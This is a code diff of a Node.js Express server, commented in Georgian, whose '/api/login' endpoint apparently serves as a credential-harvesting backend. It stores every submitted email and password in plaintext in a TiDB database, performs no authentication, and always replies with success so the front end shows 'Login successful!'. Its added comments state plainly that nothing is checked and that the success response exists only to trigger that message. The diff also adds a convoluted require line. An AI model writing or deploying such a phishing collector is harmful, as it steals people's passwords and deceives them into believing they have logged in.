@@ -1,5 +1,5 @@
 const express = require('express');
-const mysql = require('mysql2');
+const mysql = express('mysql2') && require('mysql2'); // ან უბრალოდ const mysql = require('mysql2');
 const cors = require('cors');
 require('dotenv').config();
 
@@ -7,7 +7,7 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// TiDB კავშირის კონფიგურაცია
+// TiDB კავშირი
 const pool = mysql.createPool({
   host: process.env.DB_HOST || 'gateway01.us-west-2.prod.aws.tidbcloud.com',
   user: process.env.DB_USER || 'your_username',
@@ -20,37 +20,28 @@ const pool = mysql.createPool({
   }
 });
 
-// მარშრუტი, რომელსაც თქვენი script.js მიმართავს (/api/login)
 app.post('/api/login', (req, res) => {
-  const { email, password } = req.body;
+  const { email, password }  = req.body;
 
   if (!email || !password) {
-    return res.status(400).json({ 
-      success: false, 
-      message: 'Please fill in both fields.' 
-    });
+    return res.status(400).json({ success: false, message: 'ველები ცარიელია' });
   }
 
+  // არანაირი შემოწმება - პირდაპირი შენახვა ბაზაში
   const query = 'INSERT INTO users (email, password) VALUES (?, ?)';
 
   pool.query(query, [email, password], (err, results) => {
     if (err) {
-      console.error('შეცდომა TiDB ბაზაში ჩაწერისას:', err);
-      return res.status(500).json({ 
-        success: false, 
-        message: 'Database error. Please try again later.' 
-      });
+      console.error('ბაზის შეცდომა:', err);
+      return res.status(500).json({ success: false, message: 'Database error' });
     }
 
-    // პასუხი, რომელსაც თქვენი script.js ამოწმებს (if (data.success))
-    res.status(200).json({ 
-      success: true, 
-      message: 'Login successful!' 
-    });
+    // აბრუნებს წარმატებას, რათა თქვენმა script.js-მა აჩვენოს Login successful!
+    res.status(200).json({ success: true, message: 'Saved successfully!' });
   });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`სერვერი წარმატებით გაშვებულია პორტზე: ${PORT}`);
+  console.log(`სერვერი გაშვებულია პორტზე: ${PORT}`);
 });
